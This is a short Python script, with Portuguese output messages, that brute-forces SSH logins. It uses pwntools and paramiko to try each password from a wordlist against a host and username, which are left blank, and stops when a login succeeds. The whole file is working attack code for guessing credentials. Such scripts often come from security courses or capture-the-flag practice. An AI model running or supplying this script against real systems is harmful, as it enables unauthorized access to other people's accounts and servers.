from pwn import *
import paramiko

host = ""
username = ""
attempts = 1

with open("", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] -> Testando a senha: '{password}'!")
            response = ssh(host=host, username=username, password=password, timeout=1)
            if response.connected():
                print(f">> Senha encontrada! '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Senha inválida!")
        attempts += 1
        
